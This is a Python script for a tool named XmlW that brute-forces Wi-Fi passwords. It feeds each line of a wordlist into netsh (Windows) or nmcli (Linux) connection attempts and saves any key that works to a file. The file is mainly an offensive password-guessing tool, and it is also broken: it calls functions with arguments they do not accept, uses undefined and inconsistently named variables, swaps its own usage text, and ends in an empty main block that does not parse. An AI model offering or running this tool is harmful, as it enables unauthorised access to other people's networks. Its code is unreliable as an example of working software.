import platform
from os import remove, system
from subprocess import call, PIPE, run
from sys import argv, stdout,  argv
from colorama import Fore as F


"""
Note: I can not read rockyou.txt, there a codec error, just try
another light weight or generated Wordlist. till I fix the problem.
"""

"""
Design:

    XmlW class:
        init(self, SSID, key)
        Connect()
        bruteForce()
        exec()

c++ approach:
    class Xmlw {
    public:
        std::string SSID;
        std::string config;
        Xmlw(ssid) {
            this->SSID = ssid;
        }
        int Connect() {...}
        void bruteForce() {...}
        void exec() {...}
    }

"""

USAGE = f"""
{F.YELLOW}
connects or brute forces a WAP.
bruteForce:
    Usage: XmlW [SSID] key=[key]
connecting:
    Usage: XmlW [SSID] W=[WORDLIST-PATH]
help: --help or -h
"""

print(f"""{F.LIGHTMAGENTA_EX}
██╗░░██╗███╗░░░███╗██╗░░░░░░██╗░░░░░░░██╗
╚██╗██╔╝████╗░████║██║░░░░░░██║░░██╗░░██║
░╚███╔╝░██╔████╔██║██║░░░░░░╚██╗████╗██╔╝
░██╔██╗░██║╚██╔╝██║██║░░░░░░░████╔═████║░
██╔╝╚██╗██║░╚═╝░██║███████╗░░╚██╔╝░╚██╔╝░
╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░

* a tool to brute force or connect to wifi. *

""")


class XmlW:

    def __init__(self, SSID: str = None, wordlist: str | None = None):
        
        self.SSID = SSID
        self.wordlist = wordlist

    def connect(self) -> bool:
        self.key = key # setting the key for the network.
        self.MakeConfig() # setting the content of the xml file.
        if platform.system() == "Windows":
            command = f"netsh wlan add profile filename=\"{self.SSID}.xml\" interface=\"Wi-Fi\""
            
            with open(f"{self.SSID}.xml", 'w') as file:
                file.write(self.config)

            res = bool(run(command, shell=True, stdin=PIPE, stdout=PIPE, encoding="utf-8").returncode)
            # remove(f"{self.SSID}.xml")
            return not res

        elif platform.system() == "Linux":
            command = f"nmcli dev wifi connect {self.SSID} password {self.KEY}"
            res = bool(run(command, shell=True, stdin=PIPE, stdout=PIPE, encoding="utf-8").returncode)
            return not res

    def MakeConfig(self):
        self.config = f"""<?xml version=\"1.0\"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{self.SSID}</name>
    <SSIDConfig>
        <SSID>
            <name>{self.SSID}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{self.key}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""

    def setSSID(self, ssid):
        self.SSID = ssid
    def bruteForce(self):
        
        with open(self.wordlist) as w:
            for key in w.readlines():
                res = self.connect(key)
                if res:
                    print(f"{F.LIGHTYELLOW_EX}MATCH WAS FOUND {key}")
                    print(f"NETWORK INFO:\n SSID: {self.SSID}\n KEY: {key}", 
                        file=open(f"{self.SSID}", 'w')
                    )
                else:
                    print(f"{F.RED}{key} not correct")

    def setWL(self, name):
        self.wordlist = name

    def exec(self):
        """ x[0] ssid[1] key[2]/W len == 4"""
        try:
            if len(argv) == 0:
                print(USAGE)
            elif len(argv) > 0:
                if len(argv) <= 3:
                    if len(argv) == 2:
                        if argv[1] == "--help" or argv[1] == "-h":
                            print(USAGE)
                        else:
                            print(f"{F.RED}Invalid syntax try -h or --help")
                    elif len(argv) == 3:
                        if "W" in argv[2].upper():
                            self.setWL(argv[2].split("=")[-1])
                            self.bruteForce()
                            # print("Wordlist")
                        elif "KEY" in argv[2].upper():
                            self.setSSID(argv[1])
                            self.connect(argv[2].split("=")[-1])
                            # print("KEY")

                        else:
                            print(f"{F.RED}Invalid syntax try -h or --help")
                        
        except Exception as e:
            print(f"{F.RED}{e}")

def main():
    instance = XmlW()
    instance.exec()
    print(F.RESET)



if __name__ == '__main__':
    # with open("Wordlists\\rockyou.txt") as f:
    #     for i in f.readlines():
    #         try:
    #             print(i)
    #         except:
    #             pass
